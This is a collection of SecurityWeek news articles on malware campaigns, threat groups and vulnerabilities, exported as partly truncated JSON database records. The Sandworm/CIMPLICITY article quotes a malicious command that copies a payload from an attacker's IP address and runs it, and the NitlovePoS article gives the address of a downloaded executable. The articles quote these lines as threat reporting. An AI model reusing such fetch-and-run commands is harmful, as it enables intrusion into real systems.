system.\" " }

The sites themselves were not compromised; the advertising networks they relied upon for dynamic content were serving malware. All totaled, roughly three million visitors per day were exposed to the attacks. A list of the large websites affected in the attack is available here. Among them are Yahoo's Finance, Sports and Fantasy Sports sites.  Proofpoint first detected isolated instances of this malveritising activity in late September. However, it wasn't until recently that it reached a significant level of activity, Huang blogged. After it reached a certain level, it became possible to associate disparate instances with a single campaign impacting numerous sites. Researchers observed three major ad networks delivering malvertisements to websites: OpenX, Rubicon Project and Right Media/Yahoo Advertising.    Proofpoint's last detection of issues related to this campaign was Oct. 18. By sampling roughly 100 ransom collection addresses, researchers estimated that on a daily basis the campaign generated at least 40 addresses. The campaign is believed to have lasted for at least 30 days, meaning the attackers could have pocketed $750,000.   \"It is important to recognize that the websites…were not compromised by attackers per se,\" Huang blogged. \"While it could be argued that malvertising detection on the part of the website owners would have been part of a comprehensive brand protection strategy, ultimately the sites and the ad networks were victims of an organized campaign that exploits the nature of modern content delivery networks in order to deliver malware onto end-users’ computers.\" " }

While cyber espionage groups sponsored by the same government often try to keep their campaigns separate, in the past months, researchers found connections between several groups linked to Iran. Experts identified shared code, infrastructure and even operations where two actors apparently helped each other directly. One threat group, tracked as OilRig, has been around since 2015 and it has targeted many organizations, particularly in the financial and government sectors, in the United States and Middle Eastern countries. The actor’s attacks have often involved weaponized Microsoft Excel spreadsheets tracked as Clayslide and a backdoor dubbed Helminth. In attacks observed by Palo Alto Networks this summer, hackers used new versions of Clayslide to deliver their malware. However, instead of pushing Helminth, the malicious spreadsheet delivered a variant of ISMDoor, a remote access trojan (RAT) previously used by a group tracked as Greenbug. The activities of Greenbug were brought to light in early 2017 by Symantec, which believes the group may have helped the Iran-linked hackers who launched the Shamoon 2.0 attacks against Saudi Arabia last year. The new ISMDoor variant, dubbed ISMAgent by Palo Alto Networks, is similar to the old malware as they both use DNS tunneling, but there are some significant differences. According to experts, ISMDoor accepts a longer but more rigid list of commands, while ISMAgent accepts more limited but flexible commands. Researchers previously found links between the Shamoon attacks and an Iran-linked group tracked as Magic Hound (aka Cobalt Gypsy and Timberworm), and between Magic Hound and other Iranian actors named Rocket Kitten and Newscaster (aka Charming Kitten and NewsBeef). One hacker group that is also believed to be based in Iran, which has yet to be linked to other actors, is CopyKittens. CopyKittens has been around since at least 2013, targeting government organizations, academic institutions, IT firms, and defense companies in Israel, Saudi Arabia, the U.S., Jordan, Germany and Turkey.

{ "_id" : { "$oid" : "5b27c43c6cefc41c844ab2d5" }, "Category" : "Malware", "Title" : "Five Threat Groups Target Industrial Systems: Dragos", "Address" : "https://www.securityweek.com/five-threat-groups-target-industrial-systems-dragos", "Date" : "March 01, 2018", "Article" : "There are at least five sophisticated threat groups whose activities focus on industrial control systems (ICS), according to a report published on Thursday by industrial cybersecurity firm Dragos. While it’s not uncommon for non-targeted malware to make its way onto industrial systems, targeted attacks have also become increasingly common. Dragos currently tracks five threat actors that have either attacked ICS directly or have shown an interest in gathering information on these types of systems. One of these groups is tracked by the security firm as Electrum. This is the actor behind the CRASHOVERRIDE/Industroyer malware used in December 2016 to cause a power outage in Ukraine. Electrum has been linked to Sandworm Team, which is believed to be responsible for a 2015 power outage in Ukraine. Russia has been accused for both attacks. While it apparently hasn’t launched any major attacks since the 2016 campaign targeting Ukraine’s energy sector, Dragos says Electrum continues to be active, and evidence suggests it has expanded targets. “While past ELECTRUM activity has focused exclusively on Ukraine, information from low- level ongoing events and the group’s link to SANDWORM Dragos assesses that ELECTRUM could be ‘re-tasked’ to other areas depending on the focus of their sponsor,” Dragos said in its report. Another gang tracked by Dragos is Covellite, which has been linked to North Korea’s Lazarus group. Researchers started observing Covellite in September 2017, when it launched a highly targeted phishing campaign against a U.S. electric grid company. They later spotted attacks that may have been conducted by this group aimed at organizations in Europe, North America and East Asia. Unlike Electrum, Covellite has yet to use malware specifically designed to target industrial systems in its campaigns. Dragos’ report also summarizes the activities of Dymalloy, a group whose attacks came to light during an investigation into Dragonfly, an actor that is also known as Crouching Yeti and Energetic Bear. Dragonfly, which is believed to be operating out of Russia, is known for its sophisticated Havex malware, and it was recently observed targeting control systems in U.S. energy firms. Dragos believes Dymalloy is not linked – at least not directly – to Dragonfly and its tools are not as advanced as Havex. However, the hackers did manage to breach ICS organizations in Turkey, Europe and North America, gaining access to HMI devices. Experts say Dymalloy appears to have become less active since early 2017, possibly in response to attention from the media and security researchers. Learn More at SecurityWeek’s ICS Cyber Security Conference Since mid-2017, Dragos has been tracking a group it has named Chrysene, whose activity focuses on North America, Western Europe, Israel and Iraq, particularly organizations in the electricity generation and oil&gas sectors. Chrysene, which continues to be active, has used a unique variation of a framework associated with the Iran-linked cyber espionage groups known as OilRig and Greenbug. “While CHRYSENE’s malware features notable enhancements over related threat groups using similar tools, Dragos has not yet observed an ICS-specific capability employed by this activity group. Instead, all activity thus far appears to focus on IT penetration and espionage, with all targets being ICS-related organizations,” Dragos said. It’s worth noting that the recently uncovered piece of malware known as Trisis/Triton, which is the first threat specifically designed to disrupt safety instrumented systems (SIS), has also been linked by some researchers to Iran. The last ICS-focused threat group monitored by Dragos is Magnallium, which has also been linked to Iran. The security firm started tracking this actor following a report from FireEye on the activities of APT33. While some media reports portrayed APT33 as a serious threat to ICS and critical infrastructure, Dragos’ investigation showed that the group does not appear to possess any ICS-specific capabilities. “While only one [of these groups] has demonstrated an apparent capability to impact ICS networks through ICS-specific malware directly, all have engaged in at least reconnaissance and intelligence gathering surrounding the ICS environment,” Dragos said. “These groups have remained relatively constant regarding overall activity throughout the year, and Dragos is confident that additional unknown events have occurred,” the company added.

FLARE VM – where FLARE stands for FireEye Labs Advanced Reverse Engineering – is a Windows-based security distribution inspired by Linux distros such as Kali and REMnux. It was developed by FireEye threat researcher Peter Kacherginsky in order to address the challenges associated with maintaining a custom VM. It provides a platform that includes a comprehensive collection of security tools that can be used to conduct malware analysis, reverse engineering, incident response, forensic investigations and penetration testing. It includes disassemblers, debuggers, decompilers, static and dynamic analysis, exploitation, vulnerability assessment, and network analysis tools. In order to install FLARE VM, users need a virtual machine with Windows 7 or a newer version of the operating system. From the VM, they need to visit a URL in Internet Explorer and the installation starts. The process takes 30-40 minutes, depending on the connection speed, and it involves several restarts of the system. Once the installation has been completed, users are advised to make a snapshot of the VM to save its clean state and switch networking settings to Host-Only in order to prevent the analyzed malware samples from connecting to the local network or the Internet.  According to FireEye, users can easily customize their FLARE VM installation as it is built using the Chocolatey package management system. Users can choose tools from both the Chocolatey repository and FireEye’s FLARE repository, which is continually expanded. Ensuring that the tools included in FLARE VM are up to date is also easy. Running the command “cup all” will update all the installed packages. FireEye has made available usage instructions and source code on GitHub. A blog post published by the company also provides an example for how FLARE VM can be used to analyze a malware sample. " }

The malware has been dubbed NitlovePoS and can capture and exfiltrate both track one and track two data from payment cards by scanning the running processes of the compromised machine. According to FireEye, cybercriminals have launched an attack campaign using emails with subject titles such as 'My Resume' and 'Any Openings?'. The campaign is believed to have started May 20. Inside the emails is an attachment that is disguised as a resume but is actually a Word document with an embedded malicious macro. \"To trick the recipient into enabling the malicious macro, the document claims to be a 'protected document',\" blogged FireEye researchers Nart Villeneuve and Daniel Regalado. \"If enabled, the malicious macro will download and execute a malicious executable from 80.242.123.155/exe/dro.exe.\" The cybercriminals behind this operation have been updating the payload, the researchers explained. The two payloads FireEye has observed beacon to the same server from which they are downloaded. They then receive instructions to download additional malware hosted on the server. \"We focused on the “pos.exe” malware and suspected that it maybe targeted Point of Sale machines,\" the researchers blogged. \"We speculate that once the attackers have identified a potentially interesting host form among their victims, they can then instruct the victim to download the POS malware. While we have observed many downloads of the various EXE’s [hosted] on that server, we have only observed three downloads of “pos.exe”.\" The malware adds itself to the Run registry key to guarantee it will run after every reboot, they explained. \"NitlovePOS expects to be run with the \"-\" sign as argument; otherwise it won’t perform any malicious actions,\" the researchers blogged. \"This technique can help bypass some methods of detection, particularly those that leverage automation.\" \"If the right argument is provided, NitlovePOS will decode itself in memory and start searching for payment card data,\" they continued. \"If it is not successful, NitlovePOS will sleep for five minutes and restart the searching effort.\" NitlovePoS is just one of several pieces of POS malware that have appeared so far in 2015, which has seen the emergence of malware such as Punkey and FighterPOS. According to market research firm ABI Research, the growing focus on POS systems by attackers will boost the market for security solutions aimed at protecting the point-of-sale environment. In particular, the firm cited next-generation firewalls as a key technology for enforcing network segmentation. \"The key advantage that NGFW (next-generation firewalls) provides for network segmentation is application servers and data can be designated in different segments based on their risk factors and security classifications, with access to them tightly controlled,\" said Monolina Sen, ABI Research’s senior analyst in digital security, in a statement.  ABI Research predicts the number of POS-related security incidents with confirmed data exposure will increase by the end of 2015. \"Even cybercriminals engaged in indiscriminate spam operations have POS malware available and can deploy it to s subset of their victims,\" the FireEye researchers noted. \"Due to the widespread use of POS malware, they are eventually discovered and detection increases. However, this is followed by the development of new POS with very similar functionality. Despite the similarity, the detection levels for new variants are initially quite low. This gives the cybercriminals a window of opportunity to exploit the use of a new variant. We expect that new versions of functionally similar POS malware will continue to emerge to meet the demand of the cybercrime marketplace.\"   " }

According to researchers, attackers have used specially designed documents to perform reconnaissance on infected systems and avoid sandboxes. Talos has compared this reconnaissance framework to the Russian Matryoshka nesting doll due to its complex workflow. The attacks observed by Cisco were launched during the Christmas and New Year holidays. The Word document used as bait was titled “Statement by the NATO Secretary General following a meeting of the NATO-Russia Council,” which has led experts to believe that the targets were likely NATO member countries. The text in the document has been copied from the official NATO website and the file itself does not contain any actual exploits, making it more difficult to detect. The document, an RTF file, contains several embedded objects, including OLE and Adobe Flash objects, that are extracted in succession. “The OLE object contains an Adobe Flash object. The purpose of the Adobe Flash is to extract a binary blob embedded in itself via ActionScript execution,” Talos researchers explained in a blog post. “This blob is a second encoded and compressed Adobe Flash object. The encoded algorithm is based on XOR and zlib compression. This is the second Adobe Flash in the final payload located within the document.” In the first phase, ActionScript is used to send an HTTP request containing information about the infected system to the command and control (C&C) server. This information can allow the attacker to determine if the infected system is a virtual machine or a sandbox. Two additional requests are made, each using data obtained from the response to the previous request. In the final phase, a Flash exploit is fetched, and loaded and executed on the fly. DNS data from Cisco’s Umbrella system showed that numerous requests were made to the C&C domain starting with January 16. These requests came from the security research community, which has triggered a response from the attackers. They replaced the malicious payload with junk data in order to create resource issues for some security products and disrupt investigation efforts. “[The] actor realized security researchers were poking around their infrastructure and then rigged the infrastructure to create resource issues for some security devices,” experts said. “These are the characteristics of reasonably advanced attackers who have designed an efficient minimalist framework that was able to adapt purposes on the fly.” While Cisco has not shared any information on who might be behind the attacks, NATO governments have often been targeted by Russia-linked threat actors, including the cyber espionage group known as Pawn Storm (aka APT28, Fancy Bear and Sofacy). Comparison of the reconnaissance framework to a Matryoshka doll also suggests Russian involvement. " }

SCADA (supervisory control and data acquisition) systems are used to control industrial processes. Last week, the Sandworm team was identified by researchers at iSight Partners as being at the center of attacks using CVE-2014-4114, a zero-day vulnerability in Microsoft Windows, as part of an attack campaign.  \"After beginning an investigation into the affiliated malware samples and domains, we quickly came to realization that this group is very likely targeting SCADA-centric victims who are using GE Intelligent Platform’s CIMPLICITY HMI solution suite,\" Trend Micro researchers Kyle Wilhoit and Jim Gogolinski explained in a blog post. \"We have observed this team utilizing .cim and .bcl files as attack vectors, both of which file types are used by the CIMPLICITY software. As further proof of the malware targeting CIMPILICITY, it drops files into the CIMPLICITY installation directory using the %CIMPATH% environment variable on the victim machines.\"   According to Trend Micro, the attackers were observed using emails armed with a malicious attachment that is opened by the CIMPLICITY application and attempts to exploit CVE-2014-4114 in Microsoft Windows. If the attack against the system running CIMPLICITY is successful, it attempts to download the Black Energy malware on the system. The spear-phishing emails are spoofed to appear to come from Oleh Tiahnybok, a Ukrainian politician who has been critical of Russia.       One of the command and control servers that garnered Trend Micro's attention was 94[.]185[.]85[.]122.   \"We pivoted off this C2, and located a file called config.bak (SHA1 hash: c931be9cd2c0bd896ebe98c9304fea9e),\" the researchers explained. \"This file piqued our interest right off the bat, because it is a CimEdit/CimView file. A CimEdit/CimView file is an object oriented file for GE’s Cimplicity SCADA software suite, used to administer SCADA devices.   In config.bak there are two defined events - OnOpenExecCommand and ScreenOpenDispatch. According to Trend Micro, the handler of OnOpenExecCommand is the following command line:   cmd.exe /c \"copy \\\\94[.]185[.]85[.]122\\public\\default.txt \"%CIMPATH%\\CimCMSafegs.exe\" && start \"WOW64\" \"%CIMPATH%\\CimCMSafegs.exe\"   \"It’s important to note the variable %CIMPATH% is used for the drop location of default.txt,\" the researchers noted. \"This is a standard variable that Cimplicity uses for its installs. The handler of ScreenOpenDispatch is the subroutine start(). The subroutine start() downloads the file from hxxp://94[.]185[.]85[.]122/newsfeed.xml, saves and executes the downloaded file using cscript.exe, deletes the file after execution, and terminates the current process.\"   The researchers noted that even though they are seeing CIMPLICITY being used as an attack vector, there is no indication attackers are manipulating any actual SCADA systems or data. However, since human-to-machine interfaces [HMIs] are located in both the corporate and control networks, this attack could be used to target either network segment, or used to cross from the corporate to the control network, they wrote. CVE-2014-4114 was patched by Microsoft this month with MS14-060. " }

The flaw in question, CVE-2018-4878, is a use-after-free bug that Adobe patched on February 6, following reports that North Korean hackers had been exploiting the vulnerability in attacks aimed at South Korea. The threat group, tracked as APT37, Reaper, Group123 and ScarCruft, has been expanding the scope and sophistication of its campaigns. After Adobe patched the security hole, which allows remote code execution, other malicious actors started looking into ways to exploit CVE-2018-4878. Morphisec said it spotted a campaign on February 22, which had been using a version of the exploit similar to the one developed by APT37. However, researchers pointed out that the exploit in the malspam campaign, unlike the one used in the original attacks, did not have a 64-bit version. The attack starts with a spam email containing a link to a document stored on safe-storage[.]biz. Once downloaded and opened, the document informs users that an online preview is not available and instructs them to enable editing mode in order to view the content. If users comply, the Flash vulnerability is exploited and the Windows command prompt is executed. The associated cmd.exe file is then injected with malicious shellcode that connects to the attacker’s domain. A DLL file is then downloaded by the shellcode and executed using the Microsoft Register Server (regsvr32) utility. The legitimate tool is abused in an effort to bypass whitelisting products. The malicious documents and the Flash exploit were only detected by a few security solutions based on their signature at the time of Morphisec’s analysis. Since the URLs included in the spam emails were created using Google’s URL shortening service, researchers determined that each of the different links delivered in this campaign had been clicked tens and even hundreds of times within 3-4 days of being created. Users clicked on the links from various browsers and email services, including Outlook, Gmail and Aruba.it. “As expected and predicted, adversaries have quickly adopted the Flash exploit, which is easily reproducible,” Morphisec’s Michael Gorelik explained in a blog post. “With small variations to the attack, they successfully launched a massive malspam campaign and bypassed most of the existing static scanning solutions once again.” " }

The new warning was announced by Linus Upson, Google's vice president of engineering, as a means to compliment the 'reset browser settings' feature Google added in October. According to Google, the feature allows to change their browser settings back to factory defaults. \"So, you're trying to download a free screensaver or game or something else you really want,\" Upson blogged. \"But later you find out that game came bundled with a malicious program that's trying to hijack your browser settings. You're not the only one having this problem—in fact, it's an issue that’s continuing to grow at an alarming rate. You should always be in charge of your own Chrome settings. To help keep your browser settings under your control we added a “reset browser settings” button to Chrome’s settings page in October.\" \"Despite this, settings hijacking remains our number one user complaint,\" Upson continued. \"To make sure the reset option reaches everyone who might need it, Chrome will be prompting Windows users whose settings appear to have been changed if they’d like to restore their browser settings back to factory default. If you’ve been affected by settings hijacking and would like to restore your settings, just click “Reset” on the prompt below when it appears.\" Clicking reset however will disable all extensions, apps and themes a user has installed. To reactive the extensions after a reset, users can turn to the Chrome menu under 'More tools>Extensions.' \"Some hijackers are especially pernicious and have left behind processes that are meant to undermine user control of settings, so you may find that you’re hijacked again after a short period of time,\" Upson blogged. \"If that happens you can find additional help uninstalling such programs in the Chrome help forum—and remember even if you don’t see the prompt, you can always restore Chrome to a fresh state by clicking the reset button in your Chrome settings.\" The announcement, made Jan. 31, came roughly two weeks after Google banned two extensions from its Chrome Web store after it was discovered the extensions were being used to deliver malware to users.   " }

The new malware, detected by Kaspersky Lab products as Backdoor.Win32.CowerSnail, uses the same command and control (C&C) server as the Linux malware, namely cl.ezreal.space:20480. CowerSnail was created using Qt, a cross-platform development framework. Experts believe its authors may have leveraged Qt in order to directly transfer Unix code instead of having to learn using the Windows API. On the other hand, while it does make it easier to transfer code between platforms, Qt significantly increases the size of the resulting file. Once it infects the system, the malware escalates the priority of its process and starts communicating with its C&C server through the IRC protocol. CowerSnail can collect information about the compromised machine, receive updates, execute commands, install or uninstall itself as a service, and receive updates. After it harvests system information and sends it back to the C&C domain, the malware exchanges pings with the server and waits for commands from the attackers. “After creating two separate Trojans, each designed for a specific platform and each with its own peculiarities, it is highly probable that this group will produce more malware in the future,” explained Kaspersky’s Sergey Yunakovsky. The SambaCry vulnerability exploited by the Linux malware linked to this threat actor, CVE-2017-7494, can be exploited to upload a shared library to a writable share and cause the server to load that library. This allows a remote attacker to execute arbitrary code on the targeted system. The security hole, patched in May, affects the products of several vendors, including routers and network-attached storage (NAS) appliances. In fact, one piece of malware spotted by Trend Micro in early July leverages the SambaCry vulnerability to target NAS devices, particularly ones used by small and medium-size businesses.

{ "_id" : { "$oid" : "5b27c4426cefc41c844ab2de" }, "Category" : "Malware", "Title" : "Logjam TLS Vulnerability Exposes Websites, Mail Servers: Researchers", "Address" : "https://www.securityweek.com/logjam-tls-vulnerability-exposes-websites-mail-servers-researchers", "Date" : "May 20, 2015", "Article" : "Researchers have analyzed the Diffie-Hellman (DHE) key exchange and they’ve come across a new vulnerability that puts a large number of online services at risk. The vulnerability, dubbed “Logjam,” affects the Transport Layer Security (TLS) protocol and it can be exploited through man-in-the-middle (MitM) attacks to downgrade connections to 512-bit export-grade cryptography. An attacker can leverage the flaw to read and alter encrypted data. According to experts, the attack is similar to FREAK since it’s related to support for export-grade crypto introduced in 1990 at the request of the US government. The main differences are that Logjam attacks are possible due to a TLS vulnerability rather than an implementation flaw, and Logjam targets the Diffie-Hellman cryptographic algorithm rather than the RSA algorithm. Researchers noted that websites, mail servers (SMTP, POP3S, IMAP), and other services that rely on TLS and support DHE_EXPORT ciphers are vulnerable. Expert have determined that 8.4 percent of the Alexa top one million HTTPS domains, and 3.4 percent of the browser trusted websites are at risk. The problem is that millions of HTTPS, Secure Shell (SSH), and virtual private network (VPN) servers use the same prime numbers for Diffie-Hellman key exchange. “Practitioners believed this was safe as long as new key exchange messages were generated for every connection. However, the first step in the number field sieve—the most efficient algorithm for breaking a Diffie-Hellman connection—is dependent only on this prime. After this first step, an attacker can quickly break individual connections,” researchers noted on a website detailing Logjam. The experts carried out a week-long precomputation for a 512-bit Diffie-Hellman group used by 82 percent of the vulnerable servers. It’s believed that an academic team can break a 768-bit prime, while nation-state actors can even break a 1024-bit prime, which would allow them to conduct passive eavesdropping on connections. In fact, researchers believe the NSA might have already used this technique to target VPNs. “Breaking the single, most common 1024-bit prime used by web servers would allow passive eavesdropping on connections to 18% of the Top 1 Million HTTPS domains. A second prime would allow passive decryption of connections to 66% of VPN servers and 26% of SSH servers. A close reading of published NSA leaks shows that the agency's attacks on VPNs are consistent with having achieved such a break,” researchers said. Proof-of-concept (PoC) attacks for Logjam show how an attacker can eavesdrop on a connection to the tips subdomain on the FBI’s website, how a MitM attacker can intercept a connection to Network Solutions’ webmail interface and steal a user’s credentials, and how a malicious actor could trick a user into downloading and executing arbitrary code. Experts advise web and mail server administrators to disable support for export-grade cipher suites and ensure that a unique 2048-bit Diffie-Hellman group is generated. Developers and system administrators are advised to use up-to-date TLS libraries and reject Diffie-Hellman groups smaller than 1024-bit. Google, Mozilla and Microsoft have already taken steps to mitigate Logjam attacks against Chrome, Firefox, and Internet Explorer. Apple is expected to do the same for Safari. Users are advised to keep their web browsers updated. Additional details on the Logjam attack are available in a paper published by computer scientists at Inria Nancy-Grand Est, Inria Paris-Rocquencourt, Microsoft, Johns Hopkins University, University of Michigan, and the University of Pennsylvania.

However, a researcher has uncovered a new attack vector where the malicious file is downloaded without actually being uploaded anywhere. Trustwave researcher Oren Hafif will present the new Web attack vector, which he calls Reflected File Download (RFD), at the Black Hat Europe security conference that takes place later this week in Amsterdam, the Netherlands.  RFD, which according to the researcher can be exploited even by less skilled hackers, targets both Web applications and Web-based APIs that don't deal correctly with user input and don't set content types correctly in the response. An attacker only needs to find an API that accepts user controlled input and reflects it into the response. The attack is called Reflected File Download because the malicious file is not actually hosted on the targeted website, but instead it's reflected from it.  Similar to other types of Web attacks, such as cross-site scripting (XSS), RFD requires that the victim clicks on a maliciously crafted link, an action which results in a piece of malware being downloaded to the targeted computer.  According to the researcher, this type of attack is dangerous because the URL created by the attacker points to trusted websites, such as Google.com and Bing.com. Hafif says he has identified at least 20 high-profile websites that are vulnerable to RFD attacks. When the victims click on the maliciously crafted link, the Web browser sends a request to the vulnerable website, which in turn sends back a response that's saved by the browser on the victim's computer as a file. The attacker can set the name of the malicious file in the URL that he sends to the victim.  Hafif told SecurityWeek in an interview that cybercriminals could trick users into clicking on the link by making it look like an update for a popular application, such as Google Chrome. Since the URL, which looks something like \"www.google.com/s;/ChromeSetup.bat;\", points to a legitimate Google domain, the victim doesn't suspect that the file they are downloading and executing is not actually an update, but a piece of malware. \"The attacker is getting the equivalent access as if he could upload malicious files to the server, but without uploading those files,\" the researcher said. On more recent versions of Windows, when users try to execute a file from an unknown publisher, they are presented with a security warning message. However, the researcher has found a way to bypass this security mechanism so there isn't any warning when the victim executes the downloaded file. The secret to getting Windows not to display the security warning lies in the file name, Hafif said. Once the malware is installed on the system, it can perform a wide range of tasks with administrator privileges, on the operating system level. For example, an attacker can execute OS commands that allow him to install other malware, steal data from the victim's browsing session, or gain complete control over the targeted device. An attacker can also execute malicious OS scripts, and exploit vulnerabilities in other software installed on the compromised machine.  To demonstrate the seriousness of such an attack, the researcher developed a worm that spreads through social media networks such as, Facebook, Google+, Twitter and LinkedIn. The worm hooks itself into the browser and controls it with the aid of command line flags that can completely disable Web security features. The malware can then access any website and impersonate the user on it. This allows it to spread the malicious link on all the social networks and email accounts the victim is connected to. Google and Bing were informed of the existence of the vulnerability in late March. Bing fixed the issue on the same day, but it took Google approximately three months to address the flaw on most of its domains. The researcher said the flaw can be addressed by using secure coding practices and secure configurations. Hafif told SecurityWeek that while this isn't a JSON-specific attack, JSON technologies are highly vulnerable. The researcher says websites utilizing JSON or JSONP APIs are very likely to be vulnerable to RFD attacks. While he hasn't seen or heard of any attacks leveraging the method, the researcher says it's likely to happen considering that RFD is under everyone's radar. " }

CrowdStrike has analyzed various aspects of the cybersecurity landscape in the past year, including targeted attacks launched by nation state actors, the tools and operations of cybercriminals, hacktivism, law enforcement campaigns, and the effectiveness of attacks and defense mechanisms. According to the security firm, there are several factors that led to the leveling of the playing field, but one of the most significant is the so-called “trickle-down effect.” This product adoption model states that a product initially too expensive for the masses eventually gets cheap enough for the general public to acquire. Applying this model to the cybersecurity scene, we have the EternalBlue exploit, which is believed to have been developed by the U.S. National Security Agency (NSA), getting leaked by a group named Shadow Brokers. This has allowed other state-sponsored attackers – including in the WannaCry and NotPetya attacks believed to have been launched by North Korea and Russia – and profit-driven cybercriminals to use the exploit to accomplish their own goals. On one hand, attacks such as the ones involving NotPetya and WannaCry malware have inspired cybercriminals, giving them ideas on how to maximize profits. On the other hand, state-sponsored actors have also taken inspiration from cybercriminals – both the NotPetya and WannaCry attacks were made to appear as if they were ransomware campaigns launched by profit-driven criminals. Sophisticated supply chain attacks have been typically used by nation state groups, but last year saw several incidents that did not appear to be the work of state-sponsored cyberspies. One incident involved rogue Python libraries being uploaded to the Python Package Index (PyPI). While the libraries included malicious code, it actually turned out to be benign, which has led some experts to believe that it may have been the work of a grey hat hacker. Other incidents involved a piece of macOS malware called ProtonRAT, which attackers managed to deliver last year on at least two occasions after compromising websites hosting popular video conversion and media player apps. Operation WilySupply analyzed by Microsoft also falls into this category. The list of supply chain attacks attributed to state-sponsored groups last year included the CCleaner and NetSarang incidents, which some linked to China, and the NotPetya campaign, whose initial infection vector was an updater for a Ukrainian tax accounting application. “CrowdStrike's report is just one more in a long line of publications that demonstrates the increasing futility of technical attribution. The largest detriment of this trend of nation states hiding in the hacking noise is that the security industry no longer can have confidence in its traditional technical attribution models. Relying on code usage and IPs in a world where we know tool kits and techniques are shared, stolen, and sold amongst hackers is a recipe for misattribution,” Ross Rustici, senior director of intelligence services at Cybereason, commented on the CrowdStrike report. “Hackers, especially the higher tier have proven time and again that they are capable and willing to play on cybersecurity's habit of confirmation bias by using false flags to point the community in the direction of a particular nation state or criminal group that is either: 1) currently the most talked about group making which plays into the self interest of the company of finding something that already garners a lot of media and PR attention; or 2) plays to the nationalism of the victim,” Rustici added.

Currently, there are more than two dozen potentially dangerous file types that can’t be used as attachments in Gmail, including .exe, .jar, .sys, .scr, .bat, .com, .vbs and .cmd. Starting on February 13, 2017, .js files will also be added to the list. Users who attempt to attach these types of files will see a message informing them that the file has been blocked for security reasons. A “Help” link will be provided for people who may want additional information.  For cases where users need to send .js files for legitimate reasons, Google recommends using Drive, Cloud Storage or other file-sharing services. There have been several campaigns recently where attackers delivered malware by attaching JavaScript files to emails. For instance, the cybercriminals behind the Locky ransomware used JavaScript attachments to drop downloaders, and they later started directly embedding the malicious binary into the JavaScript file. Ransomware has been increasingly using JavaScript (e.g. Ransom32, RAA) and significant spam campaigns delivering malicious .js files are not uncommon, which is probably why Google has decided to block these types of files. Google made several security improvements to Gmail in the past year: it enhanced security alerts, it started flagging unauthenticated messages and potentially dangerous URLs, and it disabled support for the RC4 cipher and the SSLv3 protocol.

RSA’s security analysts found that in this particular operation, attackers leveraged the ChewBacca Trojan to steal Track 1 and Track 2 data from payment cards swiped through infected PoS systems dating back to Oct. 25, 2013.   The ChewBacca malware is not new, and it is not exclusively used to target POS systems. While not overly complex, the malware does have the ability to log keystrokes and scrape a system’s memory. According to RSA, the memory scanner feature dumps a copy of a process’s memory and searches it for payment card data. If a card number is found, it is extracted and logged by the server, RSA said.  Named ChewBacca - after the character in Star Wars and the name given to one of its functions – Kaspersky Lab pointed out in December that the ChewBacca malware utilizes Tor's anonymity capabilities to shield an attacker’s command and control infrastructure.   RSA’s team also noticed the anonymity feature.   “RSA observed that communication is handled through the TOR network, concealing the real IP address of the Command and Control (C&C) server(s), encrypting traffic, and avoiding network-level detection,” Yotam Gottesman, a Senior Security Researcher at RSA, noted in a blog post. “The server address uses the pseudo-TLD “.onion” that is not resolvable outside of a TOR network and requires a TOR proxy app which is installed by the bot on the infected machine.”   “The ChewBacca Trojan appears to be a simple piece of malware that, despite its lack of sophistication and defense mechanisms, succeeded in stealing payment card information from several dozen retailers around the world in a little more than two months,” Gottesman added. The attacks have affected at least 41 companies, including one medium-sized retailer and several gas station chains, an RSA executive, who asked not to be named, told Bloomberg's Michael Riley. According to the executive, the attackers in this operation compromised credit-card data for about 50,000 customers. This campaign does NOT appear to be connected in any way to the recent attack against Target Corporation. Earlier this month, the FBI issued a warning to U.S. retailers, saying they should prepare for more cyber attacks after discovering roughly 20 cases over the past year that involved point of sale malware.  Additional technical details, including information on how to remove ChewBacca from an infected system, are available from RSA here.

The search engine is powered by Falcon MalQuery, which CrowdStrike claims is more than 250 times faster than other malware search tools. MalQuery uses a patent-pending indexing technology and it allows users to filter results so that they are provided only the most relevant information. CrowdStrike says its threat database has indexed more than 700 million files totaling over 560 TB of malware, and it ingests over 51 billion security events every day. String- and YARA-based searches can be conducted via a single console and results are displayed as schematized, readily consumable snapshots. The results of the search, which analyzes both a file’s metadata and content, are augmented with CrowdStrike intelligence to provide security operations center (SOC) personnel information on context and severity. The security firm pointed out that faster and more accurate search results help streamline security operations, which ultimately leads to improved protection against new threats. “Today’s threat landscape demands speed and precision – some of the best minds in cybersecurity are hampered by slow search tools and limited data sets. We believe that real-time data access is how cybersecurity professionals can get ahead of modern-day threats, and we’ve built the fastest AI-enabled platform that makes this possible,” said George Kurtz, CrowdStrike co-founder and CEO. “With today’s launch, we are fundamentally changing the game by empowering threat researchers to outpace the adversary with this solution. CrowdStrike Falcon Search Engine enables the next-gen SOC to be more productive and acts as a powerful force multiplier for security teams,” Kurtz added. Earlier this month, CrowdStrike announced that it teamed up with Dragos to provide cybersecurity services for industrial control systems (ICS). " }

According to experts, the attackers created the malicious PuTTY back in late 2013, when they uploaded a sample to VirusTotal. Symantec says this trojanized version disappeared until recently. Cybercriminals are distributing the malware by hijacking websites that appear in search engine results when users look for PuTTY. When users access the compromised site, they are taken through several redirects to a website hosted in the United Arab Emirates that is set up to serve the fake version. “Our telemetry reveals that the current distribution of the Trojanized version of PuTTY is not widespread and is not specific to one region or industry,” Symantec said in a blog post. When users initiate an SSH connection in order to securely access a remote server, the connection URL includes the server’s address, the port number, the username, and the password. The trojanized version of PuTTY is designed to copy this URL, encode it, and send it back to a server controlled by the attackers. “Attackers can ultimately use this sensitive information to get the highest level of privileges on a computer or server, (known as “root” access) which can give them complete control over the targeted system,” experts said. The trojanized PuTTY is detected by Symantec products as Hacktool, WS.Reputation.1, and Suspicious.Cloud.9. Experts noted that the rogue variant is much larger in size than the legitimate one. Since PuTTY is commonly used by system and database administrators, and web developers to access remote servers, the tool is often whitelisted and it’s not viewed as a threat by firewalls and security products. This makes the malware spotted by Symantec even more dangerous. This isn’t the first time this particular malicious actor launches a trojanized version of a popular application in an effort to steal sensitive information. In January 2014, Avast reported spotting a malicious variant of the FileZilla FTP client that was designed to harvest login details and send them to a remote server located in Germany. " }

